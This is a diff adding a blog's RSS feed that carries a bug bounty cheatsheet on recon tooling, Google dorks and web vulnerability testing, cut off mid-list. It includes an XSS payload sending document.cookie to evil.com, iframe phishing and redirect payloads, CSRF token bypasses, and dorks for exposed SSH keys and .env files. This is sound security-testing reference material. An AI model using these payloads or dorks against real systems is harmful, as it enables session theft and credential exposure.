@@ -1,0 +1,1626 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Vulnerabilities on Orangeymango</title><link>https://orangeymango.me/tags/vulnerabilities/</link><description>Recent content in Vulnerabilities on Orangeymango</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 24 Jul 2024 16:50:00 +0000</lastBuildDate><atom:link href="https://orangeymango.me/tags/vulnerabilities/index.xml" rel="self" type="application/rss+xml"/><item><title>Bug Bounty Essentials - A Comprehensive Cheatsheet</title><link>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</link><pubDate>Wed, 24 Jul 2024 16:50:00 +0000</pubDate><guid>https://orangeymango.me/p/bug-bounty-essentials-a-comprehensive-cheatsheet/</guid><description>&lt;img src="https://miro.medium.com/v2/resize:fit:1400/1*wBuE9-f32uHnqH9Sq4EFiQ.png" alt="Featured image of post Bug Bounty Essentials - A Comprehensive Cheatsheet" />&lt;h1 id="recon-workflow">Recon Workflow
+&lt;/h1>&lt;h2 id="1-initial-reconnaissance">1. Initial Reconnaissance
+&lt;/h2>&lt;h3 id="11-finding-subdomains">1.1 Finding Subdomains
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Linked &amp;amp; JS Discovery with Burp Suite Pro&lt;/strong>
+&lt;ul>
+&lt;li>Turn off passive scanning&lt;/li>
+&lt;li>Set forms to auto-submit&lt;/li>
+&lt;li>Configure scope and keywords&lt;/li>
+&lt;li>Browse the main site&lt;/li>
+&lt;li>Spider all hosts&lt;/li>
+&lt;li>Go to Target → Scope → Advanced Scope Control → Add host or IP range&lt;/li>
+&lt;li>Show only scope items&lt;/li>
+&lt;li>Select all hosts → Engagement Tools → Analyze Target → Save report as HTML file&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Other Tools for Subdomain Discovery&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>Gospider&lt;/code>&lt;/li>
+&lt;li>&lt;code>hakrawler&lt;/code>&lt;/li>
+&lt;li>&lt;code>Subdomainizer&lt;/code>:
+&lt;ul>
+&lt;li>Find subdomains referenced in JS files&lt;/li>
+&lt;li>Identify cloud services referenced in JS files&lt;/li>
+&lt;li>Use Shannon Entropy formula to find potentially sensitive items in JS files&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;code>subscraper&lt;/code>: If only looking for subdomains&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with Amass&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>amass -d example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with Subfinder v2&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>subfinder -d example.com -v&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with &lt;a class="link" href="http://github-subdomains.py/" target="_blank" rel="noopener"
+>Github-subdomains.py&lt;/a>&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>python3 github-subdomains.py -t &amp;quot;githubpersonalaccounttoken&amp;quot; -d example.com &amp;gt; example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Scraping with Cloud Ranges&lt;/strong>
+&lt;ul>
+&lt;li>Technique to monitor AWS, GCP, Azure for SSL&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="12-subdomain-brute-forcing">1.2 Subdomain Brute Forcing
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>With Amass&lt;/strong>
+&lt;ul>
+&lt;li>Guessing for live subdomains with a large list of common subdomain names&lt;/li>
+&lt;li>&lt;code>amass enum -brute -d example.com -src&lt;/code>&lt;/li>
+&lt;li>&lt;code>amass enum -brute -d example.com -rf resolvers.txt -w bruteforce.list&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>With shuffleDNS&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>shuffledns -d example.com -w words.txt -r resolvers-excellent.txt&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Subdomain Brute Forcing Lists&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/tomnomnom" target="_blank" rel="noopener"
+>Tomnomnom&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/Assetnote/commonspeak2" target="_blank" rel="noopener"
+>Assetnote Commonspeak2&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Alteration Scanning&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>altdns&lt;/code>:
+&lt;ul>
+&lt;li>&lt;code>dev1.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>dev2.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>dev-1.example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="2-infrastructure-discovery">2. Infrastructure Discovery
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Finding Infrastructure Sources&lt;/strong>
+&lt;ul>
+&lt;li>Censys&lt;/li>
+&lt;li>Robtex&lt;/li>
+&lt;li>Wayback Machine&lt;/li>
+&lt;li>DNSdumpster&lt;/li>
+&lt;li>&lt;a class="link" href="http://ptrarchive.com/" target="_blank" rel="noopener"
+>PTRarchive.com&lt;/a>&lt;/li>
+&lt;li>Netcraft&lt;/li>
+&lt;li>DNSDB Search&lt;/li>
+&lt;li>PassiveTotal&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Certificate Sources&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://crt.sh/" target="_blank" rel="noopener"
+>crt.sh&lt;/a>&lt;/li>
+&lt;li>Certspotter&lt;/li>
+&lt;li>CertDB&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Security Sources&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://hackertarget.com/" target="_blank" rel="noopener"
+>Hackertarget&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://securitytrails.com/" target="_blank" rel="noopener"
+>Security Trails&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.virustotal.com/" target="_blank" rel="noopener"
+>VirusTotal&lt;/a>&lt;/li>
+&lt;li>F-Secure&lt;/li>
+&lt;li>Riddler&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.threatcrowd.org/" target="_blank" rel="noopener"
+>ThreatCrowd&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.threatminer.org/" target="_blank" rel="noopener"
+>ThreatMiner&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="3-port-analysis--service-analysis">3. Port Analysis &amp;amp; Service Analysis
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Port Analysis with Massscan&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>massscan -p1-65535 &amp;lt;ip&amp;gt; --max-rate 1800 -oG outputfile.txt&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Port Analysis with Dnmasscan&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Service Scanning with Brutespray&lt;/strong>
+&lt;ul>
+&lt;li>Scan remote administration protocols for default passwords, which takes Nmap OG file format&lt;/li>
+&lt;li>&lt;code>Massscan&lt;/code> → &lt;code>nmapservice scan -oG&lt;/code> → &lt;code>brutespray credential brute force&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="4-vulnerability-discovery">4. Vulnerability Discovery
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Subdomain Takeover&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/haccer/subjack" target="_blank" rel="noopener"
+>Can I Take Over XYZ GitHub Repo&lt;/a>&lt;/li>
+&lt;li>&lt;code>SubOver&lt;/code>&lt;/li>
+&lt;li>&lt;code>nuclei&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Screenshotting&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>eyewitness&lt;/code>&lt;/li>
+&lt;li>&lt;code>aquatone&lt;/code>&lt;/li>
+&lt;li>&lt;code>httpscreenshot&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="5-google-dorking">5. Google Dorking
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Scraping with Google&lt;/strong>
+&lt;ul>
+&lt;li>&lt;code>site:example.com -www.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>site:example.com -www.example.com -sub.example.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>site:example.com -www.example.com -sub.example.com -dev.example.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="6-automation-tools--frameworks">6. Automation Tools &amp;amp; Frameworks
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Extending Tools&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/codingo/Interlace" target="_blank" rel="noopener"
+>Interlace&lt;/a>&lt;/li>
+&lt;li>Recon Framework&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/tomnomnom/tools" target="_blank" rel="noopener"
+>Tomnomnom Tools&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>C-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/AdmiralGaust/bountyRecon" target="_blank" rel="noopener"
+>AdmiralGaust/bountyRecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/offhoursscoding/recon" target="_blank" rel="noopener"
+>offhoursscoding/recon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/Sambal0x/recon-tools" target="_blank" rel="noopener"
+>Sambal0x/recon-tools&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/JoshuaMart/Autorecon" target="_blank" rel="noopener"
+>JoshuaMart/Autorecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/yourbuddy25/Hunter" target="_blank" rel="noopener"
+>yourbuddy25/Hunter&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://gist.github.com/dwisiswant05f647e3d406b5e984e6d69d3538968cd" target="_blank" rel="noopener"
+>ultimate_recon.sh&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>B-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/capt-meelo/LazyRecon" target="_blank" rel="noopener"
+>capt-meelo/LazyRecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/phspade/Automated-Scanner" target="_blank" rel="noopener"
+>phspade/Automated-Scanner&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener"
+>shmilylty/OneForAll&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/SolomonSklash/chomp-scan" target="_blank" rel="noopener"
+>SolomonSklash/chomp-scan&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/TypeError/domained" target="_blank" rel="noopener"
+>TypeError/domained&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/Screetsec/Sudomy" target="_blank" rel="noopener"
+>Screetsec/Sudomy&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/devanshbatham/Gorecon" target="_blank" rel="noopener"
+>devanshbatham/Gorecon&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/LordNeoStark/tugarecon" target="_blank" rel="noopener"
+>LordNeoStark/tugarecon&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>A-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener"
+>Edu4rdSHL/findomain&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/SilverPoision/Rock-ON" target="_blank" rel="noopener"
+>SilverPoision/Rock-ON&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/epi052/recon-pipeline" target="_blank" rel="noopener"
+>epi052/recon-pipeline&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>S-tier Frameworks&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://intrigue.io/" target="_blank" rel="noopener"
+>Intrigue.io&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.assetnote.io/" target="_blank" rel="noopener"
+>AssetNote&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://www.spiderfoot.net/" target="_blank" rel="noopener"
+>Spiderfoot&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://chaos.projectdiscovery.io/" target="_blank" rel="noopener"
+>Project Discovery Framework&lt;/a> - Download subdomain files of all public programs in HackerOne &amp;amp; Bugcrowd, watch for new domains&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="7-mindmaps">7. Mindmaps
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>XMind&lt;/strong>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.xmind.net/" target="_blank" rel="noopener"
+>XMind - Mind Mapping Software&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h1 id="google-dork-techniques">Google Dork Techniques
+&lt;/h1>&lt;h2 id="1-basic-search-operators">1. Basic Search Operators
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>cache:&lt;/strong>&lt;/p>
+&lt;p>Shows the cached version of any website.&lt;/p>
+&lt;p>Example: &lt;code>cache:example.com&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>allintext:&lt;/strong>&lt;/p>
+&lt;p>Searches for specific text contained on any web page.&lt;/p>
+&lt;p>Example: &lt;code>allintext: hacking tools&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>allintitle:&lt;/strong>&lt;/p>
+&lt;p>Searches for pages with titles containing specific text.&lt;/p>
+&lt;p>Example: &lt;code>allintitle:&amp;quot;Security Companies&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>allinurl:&lt;/strong>&lt;/p>
+&lt;p>Fetches results whose URL contains all the specified characters.&lt;/p>
+&lt;p>Example: &lt;code>allinurl: client area&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>filetype:&lt;/strong>&lt;/p>
+&lt;p>Searches for specific file extensions.&lt;/p>
+&lt;p>Example: &lt;code>filetype: jpg filename:id_rsa&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>inurl:&lt;/strong>&lt;/p>
+&lt;p>Searches for URLs containing a specific keyword.&lt;/p>
+&lt;p>Example: &lt;code>inurl: admin&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>intitle:&lt;/strong>&lt;/p>
+&lt;p>Searches for keywords in the title of pages.&lt;/p>
+&lt;p>Example: &lt;code>intitle:secu&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>inanchor:&lt;/strong>&lt;/p>
+&lt;p>Searches for pages with exact anchor text used in links.&lt;/p>
+&lt;p>Example: &lt;code>inanchor:&amp;quot;cyber security&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>intext:&lt;/strong>&lt;/p>
+&lt;p>Locates pages containing certain strings inside their text.&lt;/p>
+&lt;p>Example: &lt;code>intext:&amp;quot;safe internet&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>link:&lt;/strong>&lt;/p>
+&lt;p>Shows pages linking to a specified URL.&lt;/p>
+&lt;p>Example: &lt;code>link: microsoft.com&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>site:&lt;/strong>&lt;/p>
+&lt;p>Shows a list of all indexed URLs for a specified domain or subdomain.&lt;/p>
+&lt;p>Example: &lt;code>site:securitytrails.com&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>wildcard (*)&lt;/strong>&lt;/p>
+&lt;p>Used to search for pages that contain “anything” before your word.&lt;/p>
+&lt;p>Example: &lt;code>* a website&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>logical OR (|)&lt;/strong>&lt;/p>
+&lt;p>Finds sites containing either one term or another.&lt;/p>
+&lt;p>Example: &lt;code>&amp;quot;security&amp;quot; &amp;quot;tips&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>plus (+)&lt;/strong>&lt;/p>
+&lt;p>Concatenates words to detect pages using more than one specific key.&lt;/p>
+&lt;p>Example: &lt;code>security + trails&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>minus (-)&lt;/strong>&lt;/p>
+&lt;p>Excludes pages containing certain words.&lt;/p>
+&lt;p>Example: &lt;code>security -trails&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="2-advanced-search-techniques">2. Advanced Search Techniques
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Log Files&lt;/strong>&lt;/p>
+&lt;p>Searches for results including usernames inside log files.&lt;/p>
+&lt;p>Example: &lt;code>allintext:username filetype:log&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Vulnerable Web Servers&lt;/strong>&lt;/p>
+&lt;p>Detects vulnerable or hacked servers.&lt;/p>
+&lt;p>Example: &lt;code>inurl:/proc/self/cwd&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Open FTP Servers&lt;/strong>&lt;/p>
+&lt;p>Finds public FTP servers which may reveal interesting information.&lt;/p>
+&lt;p>Example: &lt;code>intitle:&amp;quot;index of&amp;quot; inurl:ftp&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>ENV Files&lt;/strong>&lt;/p>
+&lt;p>Searches for .env files used by web development frameworks.&lt;/p>
+&lt;p>Example: &lt;code>site:example.com/.env&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>SSH Private Keys&lt;/strong>&lt;/p>
+&lt;p>Finds exposed SSH private keys.&lt;/p>
+&lt;p>Example: &lt;code>intitle:index.of id_rsa -id_rsa.pub&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Putty Logs&lt;/strong>&lt;/p>
+&lt;p>Fetches SSH usernames from Putty logs.&lt;/p>
+&lt;p>Example: &lt;code>filetype:log username putty&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Email Lists&lt;/strong>&lt;/p>
+&lt;p>Searches for Excel files containing email addresses.&lt;/p>
+&lt;p>Example: &lt;code>filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>University Email Lists&lt;/strong>&lt;/p>
+&lt;p>Filters for .edu domain names to find educational email lists.&lt;/p>
+&lt;p>Example: &lt;code>site:.edu filetype:xls inurl:&amp;quot;email.xls&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="3-media-and-camera-searches">3. Media and Camera Searches
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Live Cameras&lt;/strong>&lt;/p>
+&lt;p>Fetches live camera web pages not restricted by IP.&lt;/p>
+&lt;p>Example: &lt;code>inurl:top.htm inurl:currenttime&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>WebcamXP-Based Transmissions&lt;/strong>&lt;/p>
+&lt;p>Finds webcamXP-based live streams.&lt;/p>
+&lt;p>Example: &lt;code>intitle:&amp;quot;webcamXP 5&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>General Live Cameras&lt;/strong>&lt;/p>
+&lt;p>Finds general live camera feeds.&lt;/p>
+&lt;p>Example: &lt;code>inurl:&amp;quot;lvappl.htm&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>MP3 Files&lt;/strong>&lt;/p>
+&lt;p>Searches for MP3 files available on the web.&lt;/p>
+&lt;p>Example: &lt;code>intitle: index of mp3&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>PDF Files&lt;/strong>&lt;/p>
+&lt;p>Finds legal free PDF documents.&lt;/p>
+&lt;p>Example: &lt;code>intitle: index of pdf intext: .mp4&lt;/code>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Weather Devices&lt;/strong>&lt;/p>
+&lt;p>Fetches transmissions from Weather Wing devices.&lt;/p>
+&lt;p>Example: &lt;code>intitle:&amp;quot;Weather Wing WS-2&amp;quot;&lt;/code>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h1 id="vulnerability-testing-and-approaches">Vulnerability Testing and Approaches
+&lt;/h1>&lt;h3 id="1-privilege-escalation">1. Privilege Escalation
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> Horizontal (admin-admin &amp;amp; user to user) / Vertical Privilege Escalation (User to admin)&lt;/p>
+&lt;hr>
+&lt;h3 id="2-privacy-settings-bugs">2. Privacy Settings Bugs
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong> (Details missing)&lt;/p>
+&lt;hr>
+&lt;h3 id="3-session-bugs">3. Session Bugs
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Check if session tokens/access tokens:
+&lt;ul>
+&lt;li>Expires on logout&lt;/li>
+&lt;li>Password reset/change&lt;/li>
+&lt;li>Expires on user removal&lt;/li>
+&lt;li>Expires on changing roles&lt;/li>
+&lt;li>Insufficient session fixation (cookie editor extension used)****&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="4-insecure-cors-misconfiguration">4. Insecure CORS Misconfiguration
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Curl command to detect: &lt;code>curl &amp;lt;http://site.com&amp;gt; -H &amp;quot;Origin:&amp;lt;http://evil.com&amp;gt;&amp;quot; -I&lt;/code>&lt;/li>
+&lt;li>Check &lt;code>Access-Control-Allow-Origin&lt;/code> header:
+&lt;ul>
+&lt;li>`` (not exploitable)&lt;/li>
+&lt;li>&lt;code>origin: evil.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>origin: site.evil.com&lt;/code>&lt;/li>
+&lt;li>&lt;code>origin: null&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>If any site disclosing usernames &amp;amp; password, try CORS exploit.&lt;strong>Tool Used:&lt;/strong> Corsy / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;h3 id="5-csrf">5. CSRF
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Intercept the victim request &amp;amp; generate CSRF PoC; send to server as an attacker&lt;/li>
+&lt;li>CSRF can be GET or POST based&lt;/li>
+&lt;li>Try in all state-changing requests&lt;/li>
+&lt;li>Use &lt;a class="link" href="http://jsfiddle.net/" target="_blank" rel="noopener"
+>jsfiddle.net&lt;/a> online tool&lt;/li>
+&lt;li>Check if it validates origin/referer. If not, CSRF is possible.&lt;/li>
+&lt;li>Check if it is cookie-based authentication.&lt;/li>
+&lt;li>If anti-CSRF tokens are present:
+&lt;ol>
+&lt;li>Remove anti-CSRF tokens &amp;amp; parameter&lt;/li>
+&lt;li>Pass blank parameter&lt;/li>
+&lt;li>Add similar length token&lt;/li>
+&lt;li>Add another user’s valid anti-CSRF token&lt;/li>
+&lt;li>Random token in long length (e.g., &lt;code>aaaaaaaaa&lt;/code>)&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>If content-type verification:
+&lt;ol>
+&lt;li>If no anti-CSRF tokens are present&lt;/li>
+&lt;li>Try content-type: &lt;code>text/plain&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>Flash CSRF&lt;/li>
+&lt;li>Check if any cross-domain policy using SWF JSON tool.&lt;strong>Tool Used:&lt;/strong> &lt;a class="link" href="http://jsfiddle.net/" target="_blank" rel="noopener"
+>jsfiddle.net&lt;/a> / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;h3 id="6-xss">6. XSS
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Input value (try payload like &lt;code>&amp;quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;quot;&lt;/code>) reflected without XSS protection&lt;/li>
+&lt;li>Use XSS validator - Intruder&lt;/li>
+&lt;li>Host header injection through XSS:
+&lt;ul>
+&lt;li>Add &lt;code>referer: batman&lt;/code>&lt;/li>
+&lt;li>Add &lt;code>hostheader: bing.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>URL redirection through XSS:
+&lt;ul>
+&lt;li>&lt;code>document.location.href=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Phishing through XSS - iframe injection:
+&lt;ul>
+&lt;li>&lt;code>&amp;lt;iframe src=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot; height=&amp;quot;100&amp;quot; width=&amp;quot;100&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Cookie stealing through XSS:
+&lt;ul>
+&lt;li>&lt;code>document.location.href=&amp;quot;&amp;lt;http://evil.com/p/?page=&amp;gt;&amp;quot; + document.cookie&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>File upload through XSS:
+&lt;ul>
+&lt;li>Upload a picture file, intercept it, and change &lt;code>picture.jpg&lt;/code> to XSS payload using Intruder attack&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Remote File Inclusion (RFI) through XSS:
+&lt;ul>
+&lt;li>&lt;code>php?=http://brutelogic.com.br/poc.svg - xsspayload&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Convert self XSS to reflected one:
+&lt;ul>
+&lt;li>Copy response in a &lt;code>file.html&lt;/code> -&amp;gt; it will work&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>XSS through URI parameters:
+&lt;ul>
+&lt;li>&lt;code>site.com/about/xss&amp;quot;&amp;gt;&amp;lt;script&amp;gt;&lt;/code>&lt;strong>Tool Used:&lt;/strong> XSS Validator / Burp Suite&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="7-host-header-injection">7. Host Header Injection
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>URL redirection through host header:
+&lt;ul>
+&lt;li>Check URL having 2xx, 3xx&lt;/li>
+&lt;li>Change &lt;code>X-forwarded-host&lt;/code> to &lt;code>realweb.com&lt;/code> and &lt;code>bing.com&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Web cache poisoning through Host Header Injection:
+&lt;ul>
+&lt;li>Injection will be reflected in any buttons of the page&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Host header attack on password reset page&lt;/li>
+&lt;li>XSS through Host Header Injection****&lt;/li>
+&lt;/ol>
+&lt;h3 id="8-url-redirection-or-open-redirect">8. URL Redirection or Open Redirect
+&lt;/h3>&lt;p>&lt;strong>Approach:&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Common parameter list:
+&lt;ul>
